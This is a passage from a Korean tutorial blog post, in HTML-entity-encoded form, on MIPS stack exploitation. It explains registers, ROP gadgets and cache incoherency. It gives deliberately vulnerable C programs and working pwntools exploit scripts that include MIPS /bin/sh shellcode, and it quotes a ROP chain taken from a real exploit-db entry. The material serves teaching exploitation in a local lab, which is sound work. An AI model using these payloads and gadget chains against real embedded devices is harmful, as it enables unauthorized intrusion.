&#xC608;&#xC57D;</td></tr><tr><td><strong><code>$gp</code></strong></td><td><strong><code>$28</code></strong></td><td>&#xC804;&#xC5ED; &#xD3EC;&#xC778;&#xD130;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;</td></tr><tr><td><strong><code>$sp</code></strong></td><td><strong><code>$29</code></strong></td><td>&#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;</td></tr><tr><td><strong><code>$fp</code>/<code>$s8</code></strong></td><td><strong><code>$30</code></strong></td><td>&#xD504;&#xB808;&#xC784; &#xD3EC;&#xC778;&#xD130;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;</td></tr><tr><td><strong><code>$ra</code></strong></td><td><strong><code>$31</code></strong></td><td>&#xC8FC;&#xC18C; &#xBC18;&#xD658;&#xAC12;&#xC744; &#xC800;&#xC7A5;</td></tr></tbody></table></div><p>&#xC774;&#xC911; &#xB208; &#xC5EC;&#xACA8; &#xBD10;&#xC57C; &#xD560; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; <code>ra</code>, <code>sp</code>, <code>s8</code>&#xC785;&#xB2C8;&#xB2E4;.</p><p>MIPS&#xC5D0;&#xC11C;&#xB294; <code>ra</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xD568;&#xC218; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;. x86/x64&#xC758; <code>RET</code>&#xC758; &#xC5ED;&#xD560;&#xC744; &#xD55C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nasm">0x00400734 &lt;main+0&gt;:    addiu   sp,sp,-1360x00400738 &lt;main+4&gt;:    sw      ra,132(sp)0x0040073c &lt;main+8&gt;:    sw      s8,128(sp)0x00400740 &lt;main+12&gt;:   move    s8,sp...0x004007d8 &lt;main+164&gt;:  move    sp,s80x004007dc &lt;main+168&gt;:  lw      ra,132(sp)0x004007e0 &lt;main+172&gt;:  lw      s8,128(sp)0x004007e4 &lt;main+176&gt;:  addiu   sp,sp,1360x004007e8 &lt;main+180&gt;:  jr      ra</code></pre><p>&#xD568;&#xC218; &#xD504;&#xB864;&#xB85C;&#xADF8;&#xB97C; &#xD1B5;&#xD574; <code>ra</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0;, &#xD568;&#xC218; &#xC5D0;&#xD544;&#xB85C;&#xADF8;&#xB97C; &#xD1B5;&#xD574; <code>ra</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB85C; &#xC774;&#xB3D9;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p><code>ra</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; <code>sp</code>(&#xD604;&#xC7AC; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;)&#xC640; <code>s8</code>(&#xD504;&#xB808;&#xC784; &#xD3EC;&#xC778;&#xD130;) &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, <code>sp</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBC84;&#xD37C; &#xC2DC;&#xC791; &#xC704;&#xCE58;&#xC640; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAD6C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC2A4;&#xD0DD; &#xAE30;&#xBC18; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC758; &#xCCAB;&#xAC78;&#xC74C;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nasm">lw      $s2, 24(sp)      ; sp+24 &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC744; $s2&#xC5D0; &#xB85C;&#xB4DC; (&amp;&quot;/bin/sh&quot; &#xC8FC;&#xC18C;)lw      $s1, 20(sp)      ; sp+20 &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC744; $s1&#xC5D0; &#xB85C;&#xB4DC; (&amp;system &#xC8FC;&#xC18C;)lw      $s0, 16(sp)      ; sp+16 &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC744; $s0&#xC5D0; &#xB85C;&#xB4DC; (&amp;sleep &#xC8FC;&#xC18C;)lw      $ra, 28(sp)      ; sp+28 &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC744; $ra&#xC5D0; &#xB85C;&#xB4DC; (&#xB2E4;&#xC74C; &#xAC00;&#xC82F; &#xC8FC;&#xC18C;)addiu   sp, sp, 32       ; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130; &#xC815;&#xB9AC;jr      $ra              ; $ra(&#xB2E4;&#xC74C; &#xAC00;&#xC82F;)&#xB85C; &#xC810;&#xD504;</code></pre><p>&#xC774;&#xD6C4;&#xC5D0; &#xC124;&#xBA85;&#xD560; Shellcode &#xBC0F; ROP &#xCCB4;&#xC778;&#xC5D0;&#xC11C; &#xD544;&#xC694;&#xD55C; &#xAC00;&#xC82F;&#xC758; &#xD615;&#xD0DC;&#xB97C; &#xC704;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>s0-s7</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD; &#xB0B4; &#xAC12;&#xC744; <code>lw</code> &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xB85C;&#xB4DC;&#xD558;&#xACE0;, <code>addiu</code>&#xB85C; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC815;&#xB9AC;&#xD55C; &#xD6C4;, &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB85C; <code>jr</code>&#xD558;&#xB294; &#xD615;&#xD0DC;&#xAC00; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xD615;&#xD0DC;&#xC774;&#xBBC0;&#xB85C;, &#xC0C1;&#xD669;&#xACFC; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xCDB0; &#xD544;&#xC694;&#xD55C; &#xC778;&#xC790;&#xC640; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC798; &#xC870;&#xD569;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nasm">move    $t9, $s1         ; $s1(system &#xC8FC;&#xC18C;)&#xC744; $t9(&#xD638;&#xCD9C;&#xC6A9; &#xB808;&#xC9C0;&#xC2A4;&#xD130;)&#xB85C; &#xC774;&#xB3D9;jalr    $t9              ; $t9&#xC5D0; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xC810;&#xD504;</code></pre><p>&#xD568;&#xC218; &#xC2E4;&#xD589;&#xC740; <code>jalr</code> &#xBA85;&#xB839;&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. x86-64&#xC758; <code>call</code>&#xACFC; &#xAC19;&#xC740; &#xBA85;&#xB839;&#xCC98;&#xB7FC; &#xB3D9;&#xC791; &#xB41C;&#xB2E4;&#xACE0; &#xC774;&#xD574;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="3-Cache-Incoherency"><a href="#3-Cache-Incoherency" class="headerlink" title="3. Cache Incoherency"></a>3. Cache Incoherency</h2><p>MIPS &#xD658;&#xACBD;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB41C; &#xC2E4;&#xC81C; &#xC7A5;&#xBE44;&#xB97C; &#xC775;&#xC2A4;&#xD560; &#xB54C;, IoT/&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC7A5;&#xBE44; &#xD2B9;&#xC131; &#xC0C1; Shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C; Shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C;&#xB294; &#xC8FC;&#xC758;&#xD560; &#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC14;&#xB85C; Cache&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image3.png" alt="image3.png"></p><p>MIPS&#xC5D0;&#xC11C;&#xB294; opcode&#xAC00; &#xB4E4;&#xC5B4;&#xC788;&#xB294; Instruction Cache, &#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xB294; Data Cache &#xB450; &#xAC00;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;, &#xC6B0;&#xB9AC;&#xAC00; &#xC785;&#xB825;&#xD558;&#xB294; &#xAC12;(Shellcode)&#xC740; Data Cache&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB418;&#xB294;&#xB370;, CPU&#xB294; &#xAE30;&#xC874;&#xC5D0; &#xBA85;&#xB839;&#xC774; &#xB4E4;&#xC5B4;&#xAC04; Instruction Cache&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; Cache Incoherency(&#xCE90;&#xC2DC; &#xBE44;&#xC77C;&#xAD00;&#xC131;) &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; Data Cache&#xC5D0;&#xC11C; Instruction Cache&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; Cache &#xC4F0;&#xAE30; &#xC815;&#xCC45;&#xC5D0; &#xB530;&#xB77C;, &#xBA54;&#xBAA8;&#xB9AC;&#xC640; &#xB3D9;&#xAE30;&#xD654; &#xD55C; &#xD6C4; Instruction Cache&#xB97C; &#xBE44;&#xC6B0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xAC83;&#xC740; &#xBC14;&#xB85C; Data Cache&#xB97C; flush&#xD558;&#xC5EC; Cache write&#xB97C; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image4.png" alt="image4.png"></p><p>Data Cache&#xAC00; flush&#xAC00; &#xB41C; &#xD6C4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC640; Cache &#xC0C1;&#xD0DC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. Instruction Cache&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xBA85;&#xB839;&#xC774; &#xB3D9;&#xC77C;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C;, Instruction Cache&#xB97C; &#xBE44;&#xC6C1;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC;&#xC640; &#xB3D9;&#xAE30;&#xD654; &#xB41C; Data Cache&#xC5D0; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCD0;&#xC57C; &#xBE44;&#xB85C;&#xC18C; &#xC0BD;&#xC785;&#xD55C; Shellcode&#xAC00; &#xC2E4;&#xD589;&#xC774; &#xB420; &#xC218; &#xC788;&#xB294; &#xD750;&#xB984;&#xC774; &#xB41C;&#xB2E4;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image5.png" alt="image5.png"></p><p>&#xAC00;&#xC7A5; &#xC190;&#xC26C;&#xC6B4; &#xBC29;&#xBC95;&#xC740; <code>sleep()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>sleep()</code> &#xD638;&#xCD9C; &#xC2DC;, &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB098; &#xC2A4;&#xB808;&#xC2A4;&#xC5D0; &#xC2E4;&#xD589;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, Data Cache&#xC5D0; &#xB2E4;&#xB978; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; Cache &#xC4F0;&#xAE30; &#xC815;&#xCC45;&#xC5D0; &#xB530;&#xB77C;, flush&#xAC00; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xB3C4; Data Cache&#xAC00; write &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C; shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74;, <code>sleep()</code> &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="4-MIPS-Exploit-Practice"><a href="#4-MIPS-Exploit-Practice" class="headerlink" title="4. MIPS Exploit Practice"></a>4. MIPS Exploit Practice</h2><p>&#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574;&#xC11C; MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC5F0;&#xC2B5;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="4-1-RTL"><a href="#4-1-RTL" class="headerlink" title="4-1: RTL"></a>4-1: RTL</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">target</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>{        setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; RTL&#xC744; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD; &#xB0B4; offset&#xC744; &#xAD6C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; bof&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC608;&#xC81C; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nasm">0x00400738 &lt;main+4&gt;:    sw      ra,132(sp)  ; ret0x0040073c &lt;main+8&gt;:    sw      s8,128(sp)0x00400740 &lt;main+12&gt;:  move  s8,sp...0x0040079c &lt;main+104&gt;:addiu  v0,s8,24  ; buf0x004007a0 &lt;main+108&gt;:move  a1,v0...0x004007b0 &lt;main+124&gt;:jalr  t9  ; scanf</code></pre><p>gdb&#xB85C; &#xC5B4;&#xC148;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; offset&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xB9AC;&#xD134; &#xC8FC;&#xC18C;: <code>sp + 132</code></li></ul><p>&#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xAC00; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; ra &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; sp+132 &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBC84;&#xD37C; &#xC2DC;&#xC791;: <code>sp + 24</code></li></ul><p>scanf()&#xC758; &#xC778;&#xC790;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130; <code>sp</code> &#x2192; <code>s8 + 24</code> &#xC5F0;&#xC0B0;&#xC774; &#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; offset&#xC740; 132 - 24 = 108&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *p = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">3312</span>)sh = <span class="hljs-number">0x4006e0</span>pay = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">108</span>pay += p32(sh)p.sendline(pay)p.interactive()</code></pre><p><img src="image6.png" alt="image6.png"></p><p>offset&#xC744; &#xB9DE;&#xCD94;&#xC5B4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="4-2-shellcode"><a href="#4-2-shellcode" class="headerlink" title="4-2: shellcode"></a>4-2: shellcode</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{        setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);        sleep(<span class="hljs-number">1</span>);        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf: %p\n&quot;</span>, buf);        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD55C; MIPS&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Cache Incoherency&#xB97C; &#xACE0;&#xB824;&#xD558;&#xC5EC; shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC608;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xC5ED;&#xC2DC; bof&#xAC00; &#xBC1C;&#xC0DD;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xACE0;, NX&#xB97C; &#xD574;&#xC81C;&#xD558;&#xC5EC; &#xBE4C;&#xB4DC; &#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9AC;&#xD134; &#xC8FC;&#xC18C; offset&#xC740; &#xC774;&#xC804; &#xBB38;&#xC81C;&#xC640; &#xB3D9;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image7.png" alt="image7.png"></p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC2A4;&#xD0DD; &#xC815;&#xB9AC; &#xAC00;&#xC82F;&#xC740; <code>__libc_csu_init</code>&#xB0B4; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timep = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">3312</span>)sh = <span class="hljs-string">b&quot;\x69\x6e\x02\x3c\x2f\x62\x42\x24\xec\xff\xa2\xaf\x73\x68\x03\x3c\x2f\x2f\x63\x24\xf0\xff\xa3\xaf\xf4\xff\xa0\xaf\xfc\xff\xa0\xaf\xfc\xff\xa6\x27\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01&quot;</span>sleep_addr = <span class="hljs-number">0x00400970</span>gadget = <span class="hljs-number">0x00400824</span>p.recvuntil(<span class="hljs-string">b&quot;buf: &quot;</span>)addr = int(p.recv(<span class="hljs-number">10</span>), <span class="hljs-number">16</span>)log.success(<span class="hljs-string">&quot;addr is {}&quot;</span>.format(hex(addr)))pay = shpay += <span class="hljs-string">b&quot;A&quot;</span> * (<span class="hljs-number">108</span> - len(sh))pay += p32(sleep_addr)pay += p32(gadget)pay += p32(addr)time.sleep(<span class="hljs-number">1</span>)p.sendline(pay)p.interactive()</code></pre><p><img src="image8.png" alt="image8.png"></p><p>&#xC704;&#xC640; &#xAC19;&#xC774; <code>sleep()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;, &#xC2A4;&#xD0DD; &#xC815;&#xB9AC; &#xAC00;&#xC82F; &#xC774;&#xD6C4;&#xC5D0; shellcode &#xC8FC;&#xC18C;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC785;&#xB2C8;&#xB2E4;. Shellcode&#xB294; MIPS&#xC6A9;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC2E4;&#xC81C;&#xB85C; shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; libc base leak&#xACFC; <code>sleep()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xB530;&#xB978; &#xAC00;&#xC82F; &#xD638;&#xCD9C;&#xB3C4; &#xD544;&#xC694;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, ROP &#xACF5;&#xACA9;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><p><a href="https://www.exploit-db.com/exploits/48994">https://www.exploit-db.com/exploits/48994</a></p><pre><code class="hljs python">First ROP (sleep_gadget): <span class="hljs-number">0x0004c974</span> + libc_base = <span class="hljs-number">0x2ab2e974</span><span class="hljs-number">0x0004c97c</span>      move    t9, s0<span class="hljs-number">0x0004c980</span>      lw      ra, (var_1ch)<span class="hljs-number">0x0004c984</span>      lw      s0, (var_18h)<span class="hljs-number">0x0004c988</span>      addiu   a0, zero, <span class="hljs-number">2</span> ; arg1<span class="hljs-number">0x0004c98c</span>      addiu   a1, zero, <span class="hljs-number">1</span> ; arg2<span class="hljs-number">0x0004c990</span>      move    a2, zero<span class="hljs-number">0x0004c994</span>      jr      t9Second ROP (stack_gadget): <span class="hljs-number">0x00039fa8</span> + libc_base = <span class="hljs-number">0x2ab1bfa8</span><span class="hljs-number">0x00039fa8</span>      addiu   s0, sp, <span class="hljs-number">0x28</span><span class="hljs-number">0x00039fac</span>      move    a0, s3<span class="hljs-number">0x00039fb0</span>      move    a1, s0<span class="hljs-number">0x00039fb4</span>      move    t9, s1<span class="hljs-number">0x00039fb8</span>      jalr    t9Third ROP (call_gadget): <span class="hljs-number">0x000406d8</span> + libc_base = <span class="hljs-number">0x2ab226d8</span><span class="hljs-number">0x000406d8</span>      move    t9, s0<span class="hljs-number">0x000406dc</span>      jalr    t9payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">160</span> + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode</code></pre><p>&#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD55C; ROP &#xAC00;&#xC82F;&#xACFC; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB;&#xBC88;&#xC9F8; &#xAC00;&#xC82F;&#xC740; <code>sleep()</code> &#xC0AC;&#xC6A9;&#xC744; &#xC704;&#xD574; &#xD544;&#xC694;&#xD55C; &#xC778;&#xC790; &#xC138;&#xD305;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAC00;&#xC82F;&#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC744; <code>0</code>&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD560; &#xB54C;, <code>0</code>&#xC774; &#xC544;&#xB2CC; <code>zero</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83; &#xC5ED;&#xC2DC; MIPS&#xC758; &#xD2B9;&#xC9D5;&#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xB450;&#xBC88;&#xC9F8; &#xAC00;&#xC82F;&#xC740; &#xC2A4;&#xD0DD; &#xC815;&#xB9AC; &#xAC00;&#xC82F;&#xC73C;&#xB85C;, &#xC55E;&#xC120; &#xC2E4;&#xC2B5;&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; <code>__libc_csu_init</code>&#xACFC; &#xAC19;&#xC740; &#xD568;&#xC218;&#xB4E4;&#xC5D0;&#xC11C; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xAC00;&#xC82F;&#xACFC; &#xB354;&#xBD88;&#xC5B4; ROP &#xCCB4;&#xC778;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB05D;&#xC73C;&#xB85C; MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C; 